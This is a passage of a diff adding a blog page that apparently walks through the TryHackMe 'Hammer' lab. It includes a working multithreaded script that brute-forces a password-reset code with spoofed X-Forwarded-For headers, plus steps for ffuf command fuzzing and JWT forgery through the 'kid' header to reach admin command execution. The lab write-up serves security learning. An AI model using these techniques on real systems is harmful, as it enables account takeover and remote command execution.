+        code_str = f"{code:04d}"
+        try:
+            r = session.post(
+                url,
+                data={"recovery_code": code_str, "s": "180"},
+                headers={
+                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
+                },
+                allow_redirects=False,
+            )
+            if stop_flag.is_set():
+                return
+            elif r.status_code == 302:
+                stop_flag.set()
+                print("[-] Timeout reached. Try again.")
+                return
+            else:
+                if "Invalid or expired recovery code!" not in r.text and "new_password" in r.text:
+                    stop_flag.set()
+                    print(f"[+] Found the recovery code: {code_str}")
+                    print("[+] Sending the new password request.")
+                    new_password = "password123"
+                    session.post(
+                        url,
+                        data={
+                            "new_password": new_password,
+                            "confirm_password": new_password,
+                        },
+                        headers={
+                            "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
+                        },
+                    )
+                    print(f"[+] Password is set to {new_password}")
+                    return
+        except Exception as e:
+            # print(e)
+            pass
+
+
+def main():
+    session = requests.Session()
+    print("[+] Sending the password reset request.")
+    session.post(url, data={"email": "tester@hammer.thm"})
+    print("[+] Starting the code brute-force.")
+    code_range = 10000
+    step = code_range // num_threads
+    threads = []
+    for i in range(num_threads):
+        start = i * step
+        end = start + step
+        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+
+
+if __name__ == "__main__":
+    main()
+
+</pre><h2>Running the modified script, we were successful at brute-forcing the recovery code once more and resetting the password.</h2><pre>$ python3 reset_password.py
+[+] Sending the password reset request.
+[+] Starting the code brute-force.
+[+] Found the recovery code: 4401
+[+] Sending the new password request.
+[+] Password is set to password123</pre><h2>Using these new credentials to login at <code>http://10.10.63.156:1337/index.php</code>, we get redirected to <code>http://10.10.63.156:1337/dashboard.php</code> where we get our first flag.</h2><figure><img src=/posts/hammer/14.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Second Flag</h1><h2>Discovering the Key File</h2><h3>After gaining access to the dashboard, we see a form for running commands, but before we are able to run anything, we will be redirected back to <code>http://10.10.63.156:1337/index.php</code>. Checking the source code for <code> http://10.10.63.156:1337/dashboard.php</code>, we can see it is due to this script:</h3><figure><img src=/posts/hammer/15.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h2>Since it is a client-side script, we can use <code>Burp</code> to intercept the response while logging in and simply comment out the line responsible for logging us out.</h2><figure><img src=/posts/hammer/16.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><figure><img src=/posts/hammer/17.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h2>After that, if we try to execute any commands, we see this is the request made to the <code>http://10.10.63.156:1337/execute_command.php</code> endpoint. Weirdly, it redirects us to the <code>/logout.php</code>.</h2><figure><img src=/posts/hammer/18.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h2>Also looking at the source code for <code>http://10.10.63.156:1337/dashboard.php</code>, we can see the script responsible for making the request.</h2><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line >$(document).ready(function() {
+    $('#submitCommand').click(function() {
+        var command = $('#command').val();
+        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzI1MDY3NzY4LCJleHAiOjE3MjUwNzEzNjgsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.tVSPlVoWVHQjxxEL_QgxXleQDbO9t40MzlnfXWLrYCE';
+
+        // Make an AJAX call to the server to execute the command
+        $.ajax({
+            url: 'execute_command.php',
+            method: 'POST',
+            data: JSON.stringify({ command: command }),
+            contentType: 'application/json',
+            headers: {
+                'Authorization': 'Bearer ' + jwtToken
+            },
+            success: function(response) {
+                $('#commandOutput').text(response.output || response.error);
+            },
+            error: function() {
+                $('#commandOutput').text('Error executing command.');
+            }
+        });
+    });
+});</pre><h2>Well, the script we commented out was dealing with the <code>persistentSession</code> cookie, which is absent in our request to the <code>http://10.10.63.156:1337/execute_command.php</code> and looking at our login request, we can see why. While it sets this cookie for us, it sets it with a very short lifespan.</h2><figure><img src=/posts/hammer/19.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h2>Adding this cookie back to the <code style="color: red;">http://10.10.63.156:1337/execute_command.php</code> request, this time we get the <code style="color: red;" >Command not allowed</code> error.</h2><figure><img src=/posts/hammer/20.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h2>We can save the execute command request to a file using <code style="color: red;">Burp</code> as such after modifying the command parameter to be able to fuzz allowed commands easily.</h2><figure><img src=/posts/hammer/21.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Now, we can use the saved request with ffuf to fuzz for any commands we can run using the <a href="https://github.com/yzf750/custom-fuzzing/blob/master/linux-commands-merged.txt">linux-commands-merged.txt</a> wordlist.</h1><pre>$ ffuf -request execute_command.req -request-proto http -w linux-commands-merged.txt -fr 'Command not allowed'
+...
+ls                      [Status: 200, Size: 179, Words: 1, Lines: 1, Duration: 93ms]
+...</pre><h2>It seems <code style="color: yellow;" >ls</code> is the only command we can run, and running it, we get a list of files in the current directory.</h2><figure><img src=/posts/hammer/22.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Among the listed files, <code style="color: red;" >188ade1.key</code> seems interesting; we can read it with <code style="color: yellow;" >curl.</code></h1><pre>$ curl -s 'http://10.10.63.156:1337/188ade1.key'
+56058354efb3daa97ebab00fabd7a7d7</pre><h1>Examining the JWT</h1><h2>Since executing commands didn’t lead us anywhere, let’s focus on the JWT.</h2><h3>If we try to modify the signature in the JWT or anything in the data, we get the <code style="color: red;" >Invalid token</code> error.</h3><figure><img src=/posts/hammer/23.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Examining the JWT using <a style="color: chartreuse;" href="https://jwt.io/">JWT.IO</a>, there are two interesting parts:</h1><figure><img src=/posts/hammer/24.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Forging JWT to RCE</h1><h1>The <code style="color: red;">kid</code> parameter presumably points to a file on the server, which holds the key used for signing and verifying the JWTs.</h1><h2>We can try changing it to the key file we discovered before and can use it’s contents as the key for signing our token.</h2><figure><img src=/posts/hammer/25.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Testing the token we forged, we see it works as we don’t get the <code style="color: red;" >Invalid token</code> error.</h1><figure><img src=/posts/hammer/26.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Now that we are able to forge tokens, we can change our role in the token data from <code style="color: red;" >user</code> to <code style="color: red;" >admin</code>.</h1><figure><img src=/posts/hammer/27.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>Using this token on the <code>http://10.10.63.156:1337/execute_command.php</code> endpoint, we are now able to execute commands other than the <code style="color: yellow;" >ls</code>.</h1><figure><img src=/posts/hammer/28.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h1>With this, we are able to read the second flag at <code style="color: red;" >/home/ubuntu/flag.txt</code> and complete the room.</h1><figure><img src=/posts/hammer/29.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure> 
+</main>
+    <footer class="flex flex-none justify-center">
+        <section
+            class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+            <div class="flex flex-row"><a href=https://www.linkedin.com/in/whitedevil2468 target=_blank title=LinkedIn
+                    class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
+                    <i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin"
+                            viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                            <path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z" />
+                            <path d="M8 11v5" />
+                            <path d="M8 8v.01" />
+                            <path d="M12 16v-5" />
+                            <path d="M16 16v-3a2 2 0 00-4 0" />
+                        </svg></i></a></div>
+            <div class=grow></div>
+            <div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright"
+                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                        <path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12" />
+                        <path
+                            d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25" />
+                    </svg>
+                </i>2024 W41T3XD3v1L</div>
+        </section>
+    </footer>
+    <script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script>
+    <div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg
+                class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor"
+                fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                <path
+                    d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z" />
+                <path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1" />
+            </svg></i></div>
+    <div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg
+                class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor"
+                fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                <path d="M5 12l5 5L20 7" />
+            </svg></i></div>
+    <script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script>
+</body>
+
+</html>
